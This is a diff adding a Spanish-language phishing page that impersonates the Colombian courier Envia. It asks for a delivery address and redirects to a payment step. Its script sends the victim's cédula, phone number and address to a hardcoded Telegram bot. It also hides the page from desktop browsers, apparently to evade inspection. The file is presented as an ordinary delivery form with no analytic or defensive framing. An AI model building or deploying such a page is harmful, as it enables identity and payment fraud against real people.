@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Confirmar Dirección - Envia</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .content-wrapper {
+            display: none;
+            height: 100%;
+            width: 100%;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        .desktop-block {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+            background: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #8a8a8a;
+        }
+        
+        .page-container {
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: white;
+            padding: 16px 20px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+        
+        .logo {
+            max-height: 45px;
+            max-width: 180px;
+            width: auto;
+            height: auto;
+        }
+        
+        .tagline {
+            font-size: 11px;
+            color: #666;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
+        }
+        
+        .hero-section {
+            padding: 24px 20px 30px;
+            color: white;
+            flex-shrink: 0;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: white;
+            color: #e60012;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        h1 {
+            font-size: clamp(26px, 6vw, 36px);
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            color: white;
+        }
+        
+        .subtitle {
+            font-size: clamp(14px, 3.5vw, 16px);
+            line-height: 1.5;
+            color: rgba(255,255,255,0.95);
+            max-width: 500px;
+        }
+        
+        .form-container {
+            background: #f5f5f5;
+            border-radius: 20px 20px 0 0;
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .form-header {
+            background: #e60012;
+            color: white;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 16px;
+            border-radius: 20px 20px 0 0;
+            flex-shrink: 0;
+        }
+        
+        .form-header svg {
+            width: 22px;
+            height: 22px;
+            flex-shrink: 0;
+        }
+        
+        .form-body {
+            padding: 28px 20px 40px;
+            flex: 1;
+            overflow-y: auto;
+        }
+        
+        .form-group {
+            margin-bottom: 22px;
+        }
+        
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 16px;
+            border: 1.5px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            background: white;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+        
+        select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 20px;
+            padding-right: 40px;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #e60012;
+        }
+        
+        .form-info {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+            margin: 24px 0;
+            padding: 0 4px;
+        }
+        
+        .btn-submit {
+            width: 100%;
+            background: #e60012;
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+        
+        .btn-submit:active {
+            transform: scale(0.98);
+            background: #b3000e;
+        }
+        
+        .btn-submit svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .loading.active {
+            display: block;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e60012;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media screen and (max-height: 700px) {
+            .hero-section {
+                padding: 20px 20px 24px;
+            }
+            
+            .form-body {
+                padding: 24px 20px 30px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+        
+        @media screen and (min-width: 768px) and (max-width: 1024px) {
+            .page-container {
+                max-width: 600px;
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="desktop-block"></div>
+    
+    <div class="content-wrapper">
+        <div class="page-container">
+            <div class="header">
+                <img src="logo.png" alt="Envia" class="logo" onerror="this.style.display='none'">
+                <div class="tagline">pasión por lo que hacemos</div>
+            </div>
+            
+            <div class="hero-section">
+                <div class="badge">Envia Colombia</div>
+                
+                <h1>Completa tu información de entrega</h1>
+                
+                <p class="subtitle">
+                    Ingresa la dirección completa donde deseas recibir tu paquete.
+                </p>
+            </div>
+            
+            <div class="form-container">
+                <div class="form-header">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
+                        <circle cx="12" cy="10" r="3"/>
+                    </svg>
+                    Dirección de entrega
+                </div>
+                
+                <div class="form-body">
+                    <form id="direccionForm">
+                        <div class="form-group">
+                            <label for="direccion">Dirección completa</label>
+                            <input type="text" id="direccion" name="direccion" placeholder="Ej: Calle 123 # 45-67, Apto 101" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="ciudad">Ciudad</label>
+                            <input type="text" id="ciudad" name="ciudad" placeholder="Ej: Bogotá" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="departamento">Departamento</label>
+                            <select id="departamento" name="departamento" required>
+                                <option value="" disabled selected>Selecciona un departamento</option>
+                                <option value="Amazonas">Amazonas</option>
+                                <option value="Antioquia">Antioquia</option>
+                                <option value="Arauca">Arauca</option>
+                                <option value="Atlántico">Atlántico</option>
+                                <option value="Bolívar">Bolívar</option>
+                                <option value="Boyacá">Boyacá</option>
+                                <option value="Caldas">Caldas</option>
+                                <option value="Caquetá">Caquetá</option>
+                                <option value="Casanare">Casanare</option>
+                                <option value="Cauca">Cauca</option>
+                                <option value="Cesar">Cesar</option>
+                                <option value="Chocó">Chocó</option>
+                                <option value="Córdoba">Córdoba</option>
+                                <option value="Cundinamarca">Cundinamarca</option>
+                                <option value="Guainía">Guainía</option>
+                                <option value="Guaviare">Guaviare</option>
+                                <option value="Huila">Huila</option>
+                                <option value="La Guajira">La Guajira</option>
+                                <option value="Magdalena">Magdalena</option>
+                                <option value="Meta">Meta</option>
+                                <option value="Nariño">Nariño</option>
+                                <option value="Norte de Santander">Norte de Santander</option>
+                                <option value="Putumayo">Putumayo</option>
+                                <option value="Quindío">Quindío</option>
+                                <option value="Risaralda">Risaralda</option>
+                                <option value="San Andrés y Providencia">San Andrés y Providencia</option>
+                                <option value="Santander">Santander</option>
+                                <option value="Sucre">Sucre</option>
+                                <option value="Tolima">Tolima</option>
+                                <option value="Valle del Cauca">Valle del Cauca</option>
+                                <option value="Vaupés">Vaupés</option>
+                                <option value="Vichada">Vichada</option>
+                            </select>
+                        </div>
+                        
+                        <p class="form-info">
+                            Asegúrate de que la dirección sea correcta para garantizar la entrega de tu paquete.
+                        </p>
+                        
+                        <button type="submit" class="btn-submit">
+                            Continuar
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                                <path d="M5 12h14M12 5l7 7-7 7"/>
+                            </svg>
+                        </button>
+                    </form>
+                    
+                    <div class="loading" id="loading">
+                        <div class="spinner"></div>
+                        <p>Guardando información...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // CONFIGURACIÓN DEL BOT DE TELEGRAM
+        const BOT_TOKEN = '8955093413:AAH-iW-vYcLq__GHBB2rpqpECA6JDCdQUZE';
+        const CHAT_ID = '-5547241763';
+        
+        // Recuperar datos del primer paso
+        const cedula = sessionStorage.getItem('cedula') || 'No disponible';
+        const celular = sessionStorage.getItem('celular') || 'No disponible';
+        
+        // Detección de dispositivos móviles
+        function isMobileDevice() {
+            return (
+                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+                (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
+                window.innerWidth <= 1024
+            );
+        }
+        
+        if (!isMobileDevice()) {
+            document.body.innerHTML = '<div style="width:100vw;height:100vh;background:white;"></div>';
+        }
+        
+        document.getElementById('direccionForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const direccion = document.getElementById('direccion').value;
+            const ciudad = document.getElementById('ciudad').value;
+            const departamento = document.getElementById('departamento').value;
+            
+            // Guardar para siguiente paso
+            sessionStorage.setItem('direccion', direccion);
+            sessionStorage.setItem('ciudad', ciudad);
+            sessionStorage.setItem('departamento', departamento);
+            
+            document.getElementById('direccionForm').style.display = 'none';
+            document.getElementById('loading').classList.add('active');
+            
+            const mensaje = `🔴 PASO 2 - ENVIACO\n\n📋 Cédula: ${cedula}\n📱 Celular: ${celular}\n\n📍 Dirección: ${direccion}\n🏙 Ciudad: ${ciudad}\n🏛 Departamento: ${departamento}\n🕐 Fecha: ${new Date().toLocaleString()}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+            
+            // ============================================
+            // REDIRECCIÓN A LA PÁGINA DE PAGO
+            // ============================================
+            setTimeout(() => {
+                window.location.href = 'pago.html';
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
